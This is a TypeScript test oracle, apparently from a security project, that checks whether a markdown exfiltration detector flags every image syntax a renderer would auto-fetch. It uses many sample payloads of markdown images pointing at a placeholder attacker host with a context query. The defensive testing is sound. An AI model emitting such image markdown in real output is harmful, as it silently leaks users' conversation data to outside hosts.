// T71 — the markdown oracle for the repair of T66#F-002, extended past the
// reviewer's five rows to the cases the REPAIR itself could get wrong.
//
// Oracle: `marked` (in this checkout's node_modules, offline), an independent
// CommonMark/GFM renderer. The question it answers is the only one that matters:
// does the spelling render an <img> whose src is the attacker host, i.e. does a
// markdown auto-render client fetch it with no click?
//
// Three groups:
//   A. the forms the fix must now cover, and the forms it must NOT cover;
//   B. the shapes where the balanced-description walk and the old first-`]` span
//      disagree, which is where a superset claim can quietly stop being one;
//   C. nesting depth 1..6, to pin that the description grammar is unbounded
//      rather than bounded. `marked` itself only resolves depth 1, so depths 2+
//      are recorded as detector OVER-APPROXIMATION, not as oracle-confirmed
//      fetches — a bound would be the very failure this repair exists to avoid,
//      so erring toward flagging there is the intended direction and is labelled
//      as such rather than dressed up as a renderer claim.
//
// Read-only, offline, synthetic hosts only.
// Usage: bun T71-md-oracle.ts [out.json]
import { marked } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

type Group = "A-forms" | "B-disagreement" | "C-depth";
const cases: Array<{ id: string; group: Group; text: string }> = [
  // A — the four CommonMark image spellings, and the click-gated twins
  { id: "inlineImage", group: "A-forms", text: `![a](${U})` },
  { id: "fullReference", group: "A-forms", text: `![a][a]\n\n[a]: ${U}\n` },
  { id: "collapsedReference", group: "A-forms", text: `![a][]\n\n[a]: ${U}\n` },
  { id: "shortcutReference", group: "A-forms", text: `![a]\n\n[a]: ${U}\n` },
  {
    id: "shortcutInProse",
    group: "A-forms",
    text: `See ![logo] for the badge.\n\n[logo]: ${U}\n`,
  },
  { id: "collapsedUppercase", group: "A-forms", text: `![Logo][]\n\n[logo]: ${U}\n` },
  { id: "bangMidWord", group: "A-forms", text: `Wow![link]\n\n[link]: ${U}\n` },
  { id: "indentedDefinition", group: "A-forms", text: `![a]\n\n   [a]: ${U}\n` },
  { id: "angleDefinition", group: "A-forms", text: `![a]\n\n[a]: <${U}>\n` },
  // A — must stay released: click-gated links in all three reference spellings,
  // a relative destination, and labels no definition resolves.
  { id: "ctlLinkShortcut", group: "A-forms", text: `[a]\n\n[a]: ${U}\n` },
  { id: "ctlLinkCollapsed", group: "A-forms", text: `[a][]\n\n[a]: ${U}\n` },
  { id: "ctlLinkFull", group: "A-forms", text: `[a][a]\n\n[a]: ${U}\n` },
  { id: "ctlRelativeShortcut", group: "A-forms", text: `![a]\n\n[a]: /assets/logo.png\n` },
  { id: "ctlUndefinedFullLabel", group: "A-forms", text: `![a][b]\n\n[a]: ${U}\n` },
  { id: "ctlUndefinedCollapsed", group: "A-forms", text: `![zz][]\n\n[a]: ${U}\n` },
  { id: "ctlNoDefinition", group: "A-forms", text: `![nope]\n\nplain prose\n` },
  { id: "ctlTaskListItem", group: "A-forms", text: `- [ ] todo\n\n[ ]: ${U}\n` },

  // B — the balanced walk and the old first-`]` span disagree here. Every row
  // the OLD pattern matched must still be matched (superset), and the rows only
  // the balanced walk sees are the new coverage.
  { id: "nestedDescription", group: "B-disagreement", text: `![a[b]c](${U})` },
  { id: "doubleClose", group: "B-disagreement", text: `![a[b]](${U})` },
  { id: "doubleOpen", group: "B-disagreement", text: `![[a]](${U})` },
  { id: "spacedInnerBrackets", group: "B-disagreement", text: `![x [y] z](${U})` },
  // no balanced close exists: the old first-`]` span is the one that matches,
  // and it must still match (a renderer emits no image, so this is a preserved
  // over-approximation, not a new one)
  { id: "unbalancedOpen", group: "B-disagreement", text: `![a[](${U})` },
  // the same, one the old pattern also flagged: an escaped close is not honoured
  { id: "escapedClose", group: "B-disagreement", text: `![a\\](${U})` },
  // an inline destination wins over a definition of the same label
  {
    id: "inlineBeatsDefinition",
    group: "B-disagreement",
    text: `![a](${U})\n\n[a]: https://other.invalid/x\n`,
  },
  // a reference use written after an inline construct is still found
  {
    id: "inlineThenShortcut",
    group: "B-disagreement",
    text: `![a](/rel.png) and ![b]\n\n[b]: ${U}\n`,
  },
];

for (let depth = 1; depth <= 6; depth += 1) {
  cases.push({
    id: `depth${depth}`,
    group: "C-depth",
    text: `![a${"[".repeat(depth)}${"x".repeat(depth)}${"]".repeat(depth)}b](${U})`,
  });
}

type Row = {
  id: string;
  group: Group;
  rendererFetches: boolean;
  findings: number;
  policyIds: string[];
  maskedStillLeaksHost: boolean;
  verdict: "flagged" | "partial" | "released";
};

const rows: Row[] = [];
for (const c of cases) {
  const html = await marked.parse(c.text, { async: true });
  const imgSrcs = [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/gi)].map((m) => m[1] ?? "");
  const findings = detectExfil(c.text, []);
  const redacted = applyRedaction(c.text, findings) as unknown;
  const masked =
    typeof redacted === "string"
      ? redacted
      : ((redacted as { text?: string }).text ?? String(redacted));
  rows.push({
    id: c.id,
    group: c.group,
    rendererFetches: imgSrcs.some((s) => s.includes(ATT)),
    findings: findings.length,
    policyIds: [...new Set(findings.map((f) => f.policyId))],
    maskedStillLeaksHost: masked.includes(ATT),
    verdict:
      findings.length === 0 ? "released" : masked.includes(ATT) ? "partial" : "flagged",
  });
}

for (const r of rows) {
  console.log(
    `${r.group.padEnd(15)} ${r.id.padEnd(22)} rendererFetches=${String(r.rendererFetches).padEnd(5)} detector=${r.verdict.padEnd(8)} n=${String(r.findings).padEnd(2)} ids=${JSON.stringify(r.policyIds)}`,
  );
}

// A BYPASS is a row a renderer fetches and the detector releases (or masks
// leaving the host). An OVER-APPROXIMATION is the opposite direction and is the
// only direction this floor may err in; the deep-nesting rows land here because
// `marked` resolves only depth 1.
const bypasses = rows.filter((r) => r.rendererFetches && r.verdict !== "flagged");
const overApproximations = rows.filter((r) => !r.rendererFetches && r.verdict !== "released");
console.log(
  JSON.stringify(
    {
      cases: rows.length,
      bypasses: bypasses.map((r) => r.id),
      overApproximations: overApproximations.map((r) => r.id),
      clickGatedControlsReleased: rows
        .filter((r) => r.id.startsWith("ctl"))
        .every((r) => r.verdict === "released"),
      everyDepthFlagged: rows
        .filter((r) => r.group === "C-depth")
        .every((r) => r.verdict === "flagged"),
    },
    null,
    2,
  ),
);

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ rows }, null, 2));
